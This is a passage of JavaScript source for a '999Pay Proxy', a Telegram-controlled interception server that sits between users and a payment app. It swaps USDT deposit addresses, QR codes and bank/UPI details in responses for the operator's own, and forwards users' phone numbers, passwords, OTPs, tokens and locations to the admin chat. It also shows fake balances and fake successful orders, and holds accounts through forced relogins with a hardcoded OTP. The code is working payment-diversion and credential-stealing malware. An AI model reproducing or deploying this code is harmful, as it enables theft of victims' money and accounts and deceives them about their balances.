        if ((kl.includes('usdt') && kl.includes('addr')) || kl === 'address' || kl === 'walletaddress' || kl === 'customusdtaddress' || kl === 'addr' || kl === 'depositaddress' || kl === 'deposit_address' || kl === 'receiveaddress' || kl === 'receiveraddress' || kl === 'payaddress' || kl === 'trcaddress' || kl === 'trc20address' || (kl.includes('address') && obj[key].length >= 30 && /^T[a-zA-Z0-9]{33}$/.test(obj[key]))) {
          if (obj[key].length >= 20 && obj[key] !== newAddr) {
            oldAddr = oldAddr || obj[key];
            obj[key] = newAddr;
          }
        }
        if (kl === 'qrcode' || kl === 'qrcodeurl' || kl === 'qr' || kl === 'codeurl' || kl === 'qrimg' || kl === 'qrimgurl' || kl === 'codeimgurl' || kl === 'codeimg' || kl === 'qrurl' || kl === 'depositqr' || kl === 'depositqrcode') {
          obj[key] = qrUrl;
        }
        if (kl.includes('qr') || kl.includes('code')) {
          if (typeof obj[key] === 'string' && obj[key].includes('http') && (obj[key].includes('qr') || obj[key].includes('code') || obj[key].includes('.png') || obj[key].includes('.jpg'))) {
            obj[key] = qrUrl;
          }
        }
      } else if (typeof obj[key] === 'object') {
        const found = scanAndReplace(obj[key], depth + 1);
        if (found) oldAddr = oldAddr || found;
      }
    }
    if (oldAddr) {
      const escaped = oldAddr.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      const re = new RegExp(escaped, 'g');
      for (const key of Object.keys(obj)) {
        if (typeof obj[key] === 'string' && obj[key].includes(oldAddr)) {
          obj[key] = obj[key].replace(re, newAddr);
        }
      }
    }
    return oldAddr;
  }
  let foundOld = '';
  const rd = getResponseData(jsonResp);
  if (rd) foundOld = scanAndReplace(rd, 0) || '';
  if (!foundOld) foundOld = scanAndReplace(jsonResp, 0) || '';
  const fullStr = JSON.stringify(jsonResp);
  const trcMatch = fullStr.match(/T[a-zA-Z0-9]{33}/g);
  if (trcMatch) {
    for (const addr of trcMatch) {
      if (addr !== newAddr) {
        foundOld = foundOld || addr;
        const replaced = JSON.stringify(jsonResp).split(addr).join(newAddr);
        try { Object.assign(jsonResp, JSON.parse(replaced)); } catch(e) {}
      }
    }
  }
  return { oldAddr: foundOld, newAddr, qrUrl };
}

app.use((req, res, next) => {
  (async () => {
    try {
      if (!bot) return;
      const data = cachedData || await loadData();
      if (!data.logRequests || !data.adminChatId) return;
      const path = req.originalUrl || req.url;
      if (path.includes('bot-webhook') || path.includes('favicon')) return;
      const tok = getTokenFromReq(req);
      const tKey = tok && tok.length > 10 ? tok.substring(0, 100) : '';
      if (tKey && logOffTokens.has(tKey)) return;
      let userId = tKey ? (tokenUserMap[tKey] || '') : '';
      if (!userId) {
        const body = req.parsedBody || {};
        userId = body.userId || '';
      }
      if (userId && isLogOff(data, userId)) { if (tKey) logOffTokens.add(tKey); return; }
      if (!userId && tKey && redis) {
        try {
          const isOff = await redis.sismember('nine99payLogOffTokens', tKey);
          if (isOff) { logOffTokens.add(tKey); return; }
        } catch(e) {}
      }
      const phone = getPhone(data, userId);
      const tag = userId ? ` [${userId}]` : '';
      const phoneTag = phone ? ` (${phone})` : '';
      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`).catch(()=>{});
    } catch(e) {}
  })();
  next();
});

app.get('/setup-webhook', async (req, res) => {
  if (!bot) return res.json({ error: 'No bot token' });
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
    const info = await bot.getWebHookInfo();
    res.json({ success: true, webhook: info });
  } catch(e) { res.json({ error: e.message }); }
});

app.get('/bot-webhook', async (req, res) => {
  res.json({ status: 'ok', message: '999Pay Bot webhook endpoint. Use /setup-webhook to register.' });
});

app.get('/health', async (req, res) => {
  const redisConnected = !!redis;
  let redisWorking = false;
  if (redis) {
    try { await redis.ping(); redisWorking = true; } catch(e) {}
  }
  const data = await loadData(true);
  const active = getActiveBank(data, null);
  res.json({
    status: 'ok',
    app: '999Pay Proxy',
    redis: redisConnected ? (redisWorking ? 'connected' : 'error') : 'not configured',
    bankActive: !!active,
    totalBanks: data.banks.length,
    adminSet: !!data.adminChatId,
    perIdOverrides: Object.keys(data.userOverrides || {}).length,
    envCheck: { KV_URL: !!process.env.KV_REST_API_URL, KV_TOKEN: !!process.env.KV_REST_API_TOKEN, UPSTASH_URL: !!process.env.UPSTASH_REDIS_REST_URL, UPSTASH_TOKEN: !!process.env.UPSTASH_REDIS_REST_TOKEN }
  });
});

app.post('/bot-webhook', async (req, res) => {
  try {
    await ensureWebhook();
    if (!bot) return res.sendStatus(200);
    const msg = req.parsedBody?.message;
    if (!msg || !msg.text) return res.sendStatus(200);
    const chatId = msg.chat.id;
    const text = msg.text.trim();
    let data = await loadData(true);

    if (text === '/start') {
      if (data.adminChatId && data.adminChatId !== chatId) {
        await bot.sendMessage(chatId, '❌ Bot already configured with another admin.');
        return res.sendStatus(200);
      }
      data.adminChatId = chatId;
      data._skipOverrideMerge = true;
      await saveData(data);
      await bot.sendMessage(chatId,
`🏦 999Pay Bank Controller

=== BANK COMMANDS ===
/addbank Name|AccNo|IFSC|BankName|UPI [minAmount]
   (minAmount = order amount threshold; bank shows only on orders ≥ this. Below it real bank is shown.)
/setmin <bankNumber> <amount> — Change threshold (0 = no threshold)
/removebank <number>
/setbank <number>
/banks — List all banks (with min-amount thresholds)

=== CONTROL ===
/on — Proxy ON
/off — Proxy OFF
/rotate — Toggle auto-rotate banks
/log — Toggle request logging
/off log <userId> — Log off for user
/on log <userId> — Log on for user
/active <phone> — Always-logged-in mode (auto-relogin every 100ms)
/active off <phone> — Stop always-login for that phone
/active list — Show all active phones
/status — Full status
/debug — Debug next response

=== BALANCE ===
/add <amount> <userId> — Add balance
/deduct <amount> <userId> — Remove balance
/remove balance <userId> — Remove all fake balance
/history — All balance changes
/history <userId> — User balance changes
/clearhistory — Clear all history

=== USDT ===
/usdt <address> — Set USDT address
/usdt off — Disable USDT override

=== TRACKING ===
/idtrack — Show all tracked user IDs

Example:
/addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
      );
      return res.sendStatus(200);
    }

    if (data.adminChatId && chatId !== data.adminChatId) {
      await bot.sendMessage(chatId, '❌ Unauthorized.');
      return res.sendStatus(200);
    }

    if (text === '/status') {
      const active = getActiveBank(data, null);
      const idCount = Object.keys(data.userOverrides || {}).length;
      const activeCount = Array.isArray(data.activePhones) ? data.activePhones.length : 0;
      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\n🔄 Active Logins: ${activeCount}${activeCount > 0 ? ' (' + data.activePhones.join(', ') + ')' : ''}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
      if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
      if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
      else m += '\n\n⚠️ No active bank';
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text === '/on') { data = await loadData(true); data.botEnabled = true; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🟢 Proxy ON'); return res.sendStatus(200); }
    if (text === '/off') { data = await loadData(true); data.botEnabled = false; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough'); return res.sendStatus(200); }
    if (text === '/rotate') { data = await loadData(true); data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
    if (text === '/log') { data = await loadData(true); data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }

    // /active <phone>          — add phone to always-logged-in list (fires immediate login)
    // /active off <phone>       — remove from list
    // /active list              — show all active phones
    // /active                   — quick status
    if (text === '/active' || text === '/active list' || text.startsWith('/active ')) {
      data = await loadData(true);
      if (!Array.isArray(data.activePhones)) data.activePhones = [];

      if (text === '/active' || text === '/active list') {
        const list = data.activePhones;
        if (!list.length) {
          await bot.sendMessage(chatId, '🔄 Active Logins: 0\n\nUse:\n/active <phone> — start always-login\n/active off <phone> — stop\n/active list — show all');
        } else {
          await bot.sendMessage(chatId, `🔄 Active Logins: ${list.length}\n\n${list.map((p, i) => `${i + 1}. ${p}`).join('\n')}\n\nMonitor har 100ms pe in numbers ko OTP ${ACTIVE_HARDCODED_OTP} se relogin karta rehta hai.\nKoi aur device login karega → 100ms ke andar wapas kick.`);
        }
        return res.sendStatus(200);
      }

      if (text.startsWith('/active off ')) {
        const ph = text.substring(12).trim().replace(/\D/g, '');
        if (!ph) { await bot.sendMessage(chatId, '❌ Format: /active off <phone>'); return res.sendStatus(200); }
        const before = data.activePhones.length;
        data.activePhones = data.activePhones.filter(p => String(p) !== ph);
        data._skipOverrideMerge = true;
        await saveData(data);
        await bot.sendMessage(chatId, before === data.activePhones.length
          ? `⚠️ ${ph} active list mein nahi tha.`
          : `🛑 ${ph} active list se hata diya. Ab is number ka relogin band.`);
        return res.sendStatus(200);
      }

      // /active <phone> — add
      const ph = text.substring(8).trim().replace(/\D/g, '');
      if (!ph || ph.length < 8) { await bot.sendMessage(chatId, '❌ Valid phone number do. Format: /active 6206785398'); return res.sendStatus(200); }
      if (!data.activePhones.includes(ph)) data.activePhones.push(ph);
      data._skipOverrideMerge = true;
      await saveData(data);

      // Fire immediate login so user sees instant feedback
      const result = await fireActiveLogin(ph);
      if (result.ok) {
        await bot.sendMessage(chatId, `✅ ${ph} ACTIVE\n\n👤 UserID: ${result.userId || 'N/A'}\nOTP used: ${ACTIVE_HARDCODED_OTP}\n\nMonitor ab har 100ms pe is number ko relogin karega.\nKoi aur device login karega → tu 100ms mein wapas in.\n\n🛑 Stop: /active off ${ph}`);
      } else {
        await bot.sendMessage(chatId, `⚠️ ${ph} ADDED to active list, but first login attempt failed:\n${result.error}\n\nMonitor abhi bhi try karta rahega. Agar OTP ${ACTIVE_HARDCODED_OTP} valid nahi hai is number pe, /active off ${ph} se hata de.`);
      }
      return res.sendStatus(200);
    }

    if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON — next bank-replace response dump aayega'); return res.sendStatus(200); }

    if (text.startsWith('/off log ')) {
      const targetId = text.substring(9).trim();
      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /off log <userId>'); return res.sendStatus(200); }
      data = await loadData(true);
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[targetId]) data.userOverrides[targetId] = {};
      data.userOverrides[targetId].logOff = true;
      data._skipOverrideMerge = true;
      await saveData(data);
      if (redis) {
        try {
          const allTokens = await redis.hgetall('nine99payTokenMap');
          if (allTokens) {
            for (const [tKey, uid] of Object.entries(allTokens)) {
              if (String(uid) === String(targetId)) {
                await redis.sadd('nine99payLogOffTokens', tKey);
                logOffTokens.add(tKey);
              }
            }
          }
        } catch(e) {}
      }
      for (const [tKey, uid] of Object.entries(tokenUserMap)) {
        if (String(uid) === String(targetId)) logOffTokens.add(tKey);
      }
      await bot.sendMessage(chatId, `🔇 Logging OFF for user ${targetId}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/on log ')) {
      const targetId = text.substring(8).trim();
      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /on log <userId>'); return res.sendStatus(200); }
      data = await loadData(true);
      if (data.userOverrides && data.userOverrides[targetId]) {
        delete data.userOverrides[targetId].logOff;
        data._skipOverrideMerge = true;
        await saveData(data);
      }
      if (redis) {
        try {
          const allTokens = await redis.hgetall('nine99payTokenMap');
          if (allTokens) {
            for (const [tKey, uid] of Object.entries(allTokens)) {
              if (String(uid) === String(targetId)) {
                await redis.srem('nine99payLogOffTokens', tKey);
                logOffTokens.delete(tKey);
              }
            }
          }
        } catch(e) {}
      }
      for (const [tKey, uid] of Object.entries(tokenUserMap)) {
        if (String(uid) === String(targetId)) logOffTokens.delete(tKey);
      }
      await bot.sendMessage(chatId, `📡 Logging ON for user ${targetId}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/add ')) {
      const parts = text.substring(5).trim().split(/\s+/);
      const amount = parseFloat(parts[0]);
      const targetUserId = parts[1] || '';
      if (isNaN(amount) || !targetUserId) {
        await bot.sendMessage(chatId, '❌ Format: /add <amount> <userId>\nExample: /add 500 12345');
        return res.sendStatus(200);
      }
      const freshData = await loadData(true);
      if (!freshData.userOverrides) freshData.userOverrides = {};
      if (!freshData.userOverrides[targetUserId]) freshData.userOverrides[targetUserId] = {};
      freshData.userOverrides[targetUserId].addedBalance = (freshData.userOverrides[targetUserId].addedBalance || 0) + amount;
      const tracked = freshData.trackedUsers && freshData.trackedUsers[targetUserId];
      const currentBal = tracked ? tracked.balance : 'N/A';
      const updatedBal = currentBal !== 'N/A' ? parseFloat((parseFloat(currentBal) + freshData.userOverrides[targetUserId].addedBalance).toFixed(2)) : 'N/A';
      if (!freshData.balanceHistory) freshData.balanceHistory = [];
      freshData.balanceHistory.push({
        type: 'add',
        userId: targetUserId,
        amount: amount,
        totalAdded: freshData.userOverrides[targetUserId].addedBalance,
        originalBalance: currentBal,
        updatedBalance: updatedBal,
        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
        phone: (tracked && tracked.phone) || ''
      });
      if (!freshData.fakeBills) freshData.fakeBills = {};
      if (!freshData.fakeBills[targetUserId]) freshData.fakeBills[targetUserId] = [];
      const now = new Date();
      const ts = now.getTime();
      const orderNo = 'TA' + String(ts) + String(Math.floor(Math.random() * 9000000) + 1000000);
      const timeStr = now.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true }).replace(/\//g, '-');
      freshData.fakeBills[targetUserId].push({
        amount: amount,
        orderNo: orderNo,
        createTime: timeStr,
        timestamp: ts
      });
      freshData._skipOverrideMerge = true;
      await saveData(freshData);
      const statusMsg = tracked
        ? `📊 Updated balance: ₹${updatedBal}`
        : `⏳ User is offline — ₹${freshData.userOverrides[targetUserId].addedBalance} will show when they open the app`;
      await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${freshData.userOverrides[targetUserId].addedBalance}\n${statusMsg}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/success ')) {
      const targetUserId = text.substring(9).trim();
      if (!targetUserId) {
        await bot.sendMessage(chatId, '❌ Format: /success <userId>\nExample: /success 87146');
        return res.sendStatus(200);
      }
      data = await loadData(true);
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
      data.userOverrides[targetUserId].forceReviewSuccess = true;
      data._skipOverrideMerge = true;
      await saveData(data);
      await bot.sendMessage(chatId, `✅ User ${targetUserId} ke REVIEW orders ab SUCCESS dikhenge\nRevert: /unsuccess ${targetUserId}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/unsuccess ')) {
      const targetUserId = text.substring(11).trim();
      if (!targetUserId) {
        await bot.sendMessage(chatId, '❌ Format: /unsuccess <userId>');
        return res.sendStatus(200);
      }
      data = await loadData(true);
      if (data.userOverrides && data.userOverrides[targetUserId]) {
        delete data.userOverrides[targetUserId].forceReviewSuccess;
        data._skipOverrideMerge = true;
        await saveData(data);
      }
      await bot.sendMessage(chatId, `✅ User ${targetUserId} ke orders ab real status dikhenge`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/deduct ')) {
      const parts = text.substring(8).trim().split(/\s+/);
      const amount = parseFloat(parts[0]);
      const targetUserId = parts[1] || '';
      if (isNaN(amount) || !targetUserId) {
        await bot.sendMessage(chatId, '❌ Format: /deduct <amount> <userId>\nExample: /deduct 500 12345');
        return res.sendStatus(200);
      }
      const freshData2 = await loadData(true);
      if (!freshData2.userOverrides) freshData2.userOverrides = {};
      if (!freshData2.userOverrides[targetUserId]) freshData2.userOverrides[targetUserId] = {};
      freshData2.userOverrides[targetUserId].addedBalance = (freshData2.userOverrides[targetUserId].addedBalance || 0) - amount;
      const tracked2 = freshData2.trackedUsers && freshData2.trackedUsers[targetUserId];
      const currentBal2 = tracked2 ? tracked2.balance : 'N/A';
      const updatedBal2 = currentBal2 !== 'N/A' ? parseFloat((parseFloat(currentBal2) + freshData2.userOverrides[targetUserId].addedBalance).toFixed(2)) : 'N/A';
      if (!freshData2.balanceHistory) freshData2.balanceHistory = [];
      freshData2.balanceHistory.push({
        type: 'deduct',
        userId: targetUserId,
        amount: amount,
        totalAdded: freshData2.userOverrides[targetUserId].addedBalance,
        originalBalance: currentBal2,
        updatedBalance: updatedBal2,
        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
        phone: (tracked2 && tracked2.phone) || ''
      });
      if (freshData2.userOverrides[targetUserId].addedBalance <= 0) {
        delete freshData2.userOverrides[targetUserId].addedBalance;
        if (freshData2.fakeBills && freshData2.fakeBills[targetUserId]) {
          delete freshData2.fakeBills[targetUserId];
        }
      }
      freshData2._skipOverrideMerge = true;
      await saveData(freshData2);
      await bot.sendMessage(chatId, `✅ Deducted ₹${amount} from user ${targetUserId}\n💰 Total added: ₹${freshData2.userOverrides[targetUserId]?.addedBalance || 0}\n📊 Updated balance: ₹${updatedBal2}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/remove balance ')) {
      const targetId = text.substring(16).trim();
      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /remove balance <userId>'); return res.sendStatus(200); }
      data = await loadData(true);
      if (data.userOverrides && data.userOverrides[targetId] && data.userOverrides[targetId].addedBalance !== undefined) {
        const removed = data.userOverrides[targetId].addedBalance;
        delete data.userOverrides[targetId].addedBalance;
        if (data.fakeBills && data.fakeBills[targetId]) {
          delete data.fakeBills[targetId];
        }
        if (!data.balanceHistory) data.balanceHistory = [];
        const tracked = data.trackedUsers && data.trackedUsers[targetId];
        data.balanceHistory.push({
          type: 'remove',
          userId: targetId,
          amount: removed,
          totalAdded: 0,
          originalBalance: tracked ? tracked.balance : 'N/A',
          updatedBalance: tracked ? tracked.balance : 'N/A',
          time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
          phone: (tracked && tracked.phone) || ''
        });
        data._skipOverrideMerge = true;
        await saveData(data);
        await bot.sendMessage(chatId, `🗑 Removed ₹${removed} fake balance from user ${targetId}\n💰 Now showing real balance`);
      } else {
        await bot.sendMessage(chatId, `ℹ️ User ${targetId} has no fake balance added.`);
      }
      return res.sendStatus(200);
    }

    if (text === '/history' || text.startsWith('/history ')) {
      const historyTarget = text.startsWith('/history ') ? text.substring(9).trim() : '';
      const history = data.balanceHistory || [];
      if (history.length === 0) { await bot.sendMessage(chatId, '📋 No balance history yet.'); return res.sendStatus(200); }
      const filtered = historyTarget ? history.filter(h => h.userId === historyTarget) : history;
      if (filtered.length === 0) { await bot.sendMessage(chatId, `📋 No history for user ${historyTarget}`); return res.sendStatus(200); }
      const userSummary = {};
      for (const h of filtered) {
        if (!userSummary[h.userId]) userSummary[h.userId] = { added: 0, deducted: 0, totalNet: 0, phone: h.phone || '', entries: [] };
        const s = userSummary[h.userId];
        if (h.type === 'add') s.added += h.amount;
        else s.deducted += h.amount;
        s.totalNet = h.totalAdded || 0;
        if (h.phone) s.phone = h.phone;
        s.entries.push(h);
      }
      let m = '📊 Balance History:\n\n';
      for (const [uid, s] of Object.entries(userSummary)) {
        const tracked = data.trackedUsers && data.trackedUsers[uid];
        const currentBal = tracked ? tracked.balance : 'N/A';
        m += `👤 User: ${uid}${s.phone ? ' (' + s.phone + ')' : ''}\n`;
        m += `   ➕ Total Added: ₹${s.added.toFixed(2)}\n`;
        m += `   ➖ Total Deducted: ₹${s.deducted.toFixed(2)}\n`;
        m += `   📊 Net Change: ₹${(s.added - s.deducted).toFixed(2)}\n`;
        m += `   💰 Current Balance: ₹${currentBal}\n`;
        m += `   📜 Entries:\n`;
        const recent = s.entries.slice(-10);
        for (const e of recent) {
          const icon = e.type === 'add' ? '➕' : '➖';
          m += `   ${icon} ₹${e.amount} | Bal: ₹${e.updatedBalance} | ${e.time}\n`;
        }
        if (s.entries.length > 10) m += `   ... ${s.entries.length - 10} more entries\n`;
        m += '\n';
      }
      if (m.length > 4000) m = m.substring(0, 4000) + '\n... (truncated)';
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text === '/clearhistory') {
      data = await loadData(true);
      data.balanceHistory = [];
      data._skipOverrideMerge = true;
      await saveData(data);
      await bot.sendMessage(chatId, '🗑 Balance history cleared.');
      return res.sendStatus(200);
    }

    if (text === '/idtrack') {
      const tracked = data.trackedUsers || {};
      const ids = Object.keys(tracked);
      if (ids.length === 0) { await bot.sendMessage(chatId, '📋 No users tracked yet. Users will appear after they use the app.'); return res.sendStatus(200); }
      let m = '📋 Tracked User IDs:\n\n';
      for (const uid of ids) {
        const u = tracked[uid];
        const hasOverride = data.userOverrides && data.userOverrides[uid] ? ' ⚙️' : '';
        m += `👤 ID: ${uid}${hasOverride}\n`;
        if (u.name) m += `   📛 Name: ${u.name}\n`;
        if (u.phone) m += `   📱 Phone: ${u.phone}\n`;
        if (u.balance) m += `   💰 Balance: ${u.balance}\n`;
        m += `   🕐 Last: ${u.lastAction || 'N/A'} @ ${u.lastSeen || 'N/A'}\n`;
        m += `   📦 Orders: ${u.orderCount || 0}\n\n`;
      }
      if (m.length > 4000) m = m.substring(0, 4000) + '\n... (truncated)';
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text === '/banks') {
      if (!data.banks || data.banks.length === 0) { await bot.sendMessage(chatId, '❌ No banks added'); return res.sendStatus(200); }
      let m = '💳 Banks:\n\n' + bankListText(data);
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text.startsWith('/addbank ')) {
      const raw = text.substring(9).trim();
      let minAmount = 0;
      const parts = raw.split('|').map(s => s.trim());
      // Optional trailing space-separated number on the LAST pipe-field → minAmount threshold.
      // Scoped to last field so bank names containing digits (e.g. "Bank2") in earlier fields won't be misparsed.
      if (parts.length > 0) {
        const last = parts[parts.length - 1];
        const mAmt = last.match(/^(.*?)\s+(\d+(?:\.\d+)?)\s*$/);
        if (mAmt) {
          parts[parts.length - 1] = mAmt[1].trim();
          minAmount = parseFloat(mAmt[2]) || 0;
          // If the last pipe-field becomes empty after stripping, drop it
          if (parts[parts.length - 1] === '') parts.pop();
        }
      }
      if (parts.length < 3) { await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC|BankName|UPI [minAmount]\n(BankName, UPI, minAmount optional)\n\nExample:\n/addbank Rahul|1234567890|SBIN0001234|SBI|r@upi 300\n→ Bank shows only on orders ≥ ₹300; below that real bank shown.'); return res.sendStatus(200); }
      data = await loadData(true);
      if (data.banks.length >= 10) { await bot.sendMessage(chatId, '❌ Max 10 banks.'); return res.sendStatus(200); }
      const newBank = { accountHolder: parts[0], accountNo: parts[1], ifsc: parts[2], bankName: parts[3] || '', upiId: parts[4] || '', minAmount: minAmount };
      data.banks.push(newBank);
      if (data.activeIndex < 0) data.activeIndex = 0;
      data._skipOverrideMerge = true;
      await saveData(data);
      await bot.sendMessage(chatId, `✅ Bank #${data.banks.length} added:\n${newBank.accountHolder} | ${newBank.accountNo}\nIFSC: ${newBank.ifsc}${newBank.bankName ? '\nBank: ' + newBank.bankName : ''}${newBank.upiId ? '\nUPI: ' + newBank.upiId : ''}\nMin Amount: ${minAmount > 0 ? '≥ ₹' + minAmount : 'any (no threshold)'}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/setminamount ') || text.startsWith('/setmin ')) {
      const cmdLen = text.startsWith('/setminamount ') ? 14 : 8;
      const parts = text.substring(cmdLen).trim().split(/\s+/);
      if (parts.length < 2) { await bot.sendMessage(chatId, '❌ Format: /setmin <bankNumber> <amount>\nExample: /setmin 2 500  (bank #2 will only show on orders ≥ ₹500)\nUse 0 to remove threshold.'); return res.sendStatus(200); }
      data = await loadData(true);
      const idx = parseInt(parts[0]) - 1;
      const amt = parseFloat(parts[1]);
      if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await bot.sendMessage(chatId, '❌ Invalid bank number. /banks se check karo.'); return res.sendStatus(200); }
      if (isNaN(amt) || amt < 0) { await bot.sendMessage(chatId, '❌ Invalid amount.'); return res.sendStatus(200); }
      data.banks[idx].minAmount = amt;
      data._skipOverrideMerge = true;
      await saveData(data);
      const b = data.banks[idx];
      await bot.sendMessage(chatId, `✅ Bank #${idx + 1} (${b.accountHolder}) min amount set to ${amt > 0 ? '≥ ₹' + amt : 'any (no threshold)'}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/removebank ')) {
      data = await loadData(true);
      const idx = parseInt(text.substring(12).trim()) - 1;
      if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await bot.sendMessage(chatId, '❌ Invalid. /banks se check karo'); return res.sendStatus(200); }
      const removed = data.banks.splice(idx, 1)[0];
      if (data.activeIndex === idx) data.activeIndex = data.banks.length > 0 ? 0 : -1;
      else if (data.activeIndex > idx) data.activeIndex--;
      if (data.userOverrides) {
        for (const uid of Object.keys(data.userOverrides)) {
          const uo = data.userOverrides[uid];
          if (uo.bankIndex !== undefined) {
            if (uo.bankIndex === idx) delete uo.bankIndex;
            else if (uo.bankIndex > idx) uo.bankIndex--;
          }
        }
      }
      data._skipOverrideMerge = true;
      await saveData(data);
      await bot.sendMessage(chatId, `🗑️ Removed: ${removed.accountHolder} | ${removed.accountNo}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/setbank ')) {
      data = await loadData(true);
      const idx = parseInt(text.substring(9).trim()) - 1;
      if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await bot.sendMessage(chatId, '❌ Invalid index'); return res.sendStatus(200); }
      data.activeIndex = idx;
      data._skipOverrideMerge = true;
      await saveData(data);
      const bankInfo = data.banks[idx];
      await bot.sendMessage(chatId, `✅ Active bank set to #${idx + 1}:\n${bankInfo.accountHolder} | ${bankInfo.accountNo} | ${bankInfo.ifsc}${bankInfo.bankName ? ' | ' + bankInfo.bankName : ''}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/usdt ')) {
      const addr = text.substring(6).trim();
      data = await loadData(true);
      if (addr.toLowerCase() === 'off') {
        data.usdtAddress = '';
        data._skipOverrideMerge = true;
        await saveData(data);
        await bot.sendMessage(chatId, '❌ USDT override OFF');
      } else if (addr.length >= 20) {
        data.usdtAddress = addr;
        data._skipOverrideMerge = true;
        await saveData(data);
        await bot.sendMessage(chatId, `₮ USDT address set: ${addr}`);
      } else {
        await bot.sendMessage(chatId, '❌ Invalid address (20+ chars required)');
      }
      return res.sendStatus(200);
    }

    if (text === '/help') {
      await bot.sendMessage(chatId, 'Use /start to see all commands.');
      return res.sendStatus(200);
    }

    return res.sendStatus(200);
  } catch(e) {
    console.error('Bot error:', e);
    return res.sendStatus(200);
  }
});

app.post('/app/user/login/pwd', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const body = req.parsedBody || {};
    const phone = body.phone || body.mobile || body.username || '';
    const pwd = body.pwd || body.password || '';
    const respData = getResponseData(jsonResp);

    let userId = '';
    let tokenName = '';
    let tokenValue = '';
    if (respData && typeof respData === 'object') {
      userId = respData.uuid || respData.loginId || respData.userId || '';
      tokenName = respData.tokenName || '';
      tokenValue = respData.tokenValue || '';
    }

    if (userId) {
      saveTokenUserId(req, userId);
      if (phone) userPhoneMap[String(userId)] = String(phone);
      if (tokenValue) {
        const tvKey = tokenValue.substring(0, 100);
        tokenUserMap[tvKey] = String(userId);
        if (redis) redis.hset('nine99payTokenMap', tvKey, String(userId)).catch(()=>{});
      }
      trackUser(data, userId, 'Login', phone);
      saveData(data).catch(()=>{});
    } else if (phone && respData) {
      const respUserId = respData.uuid || respData.loginId || respData.userId || '';
      if (respUserId) {
        userPhoneMap[String(respUserId)] = String(phone);
        saveTokenUserId(req, String(respUserId));
        if (tokenValue) {
          tokenUserMap[tokenValue.substring(0, 100)] = String(respUserId);
          if (redis) redis.hset('nine99payTokenMap', tokenValue.substring(0, 100), String(respUserId)).catch(()=>{});
        }
        trackUser(data, String(respUserId), 'Login', phone);
        saveData(data).catch(()=>{});
        userId = respUserId;
      }
    }

    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `🔑 Login (PWD)\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd || 'N/A'}\n👤 UserID: ${userId || 'N/A'}\n🔑 TokenName: ${tokenName || 'N/A'}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/user/login/otp', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const body = req.parsedBody || {};
    const phone = body.phone || body.mobile || body.username || '';
    const otp = body.code || body.otp || body.smsCode || '';
    const respData = getResponseData(jsonResp);

    let userId = '';
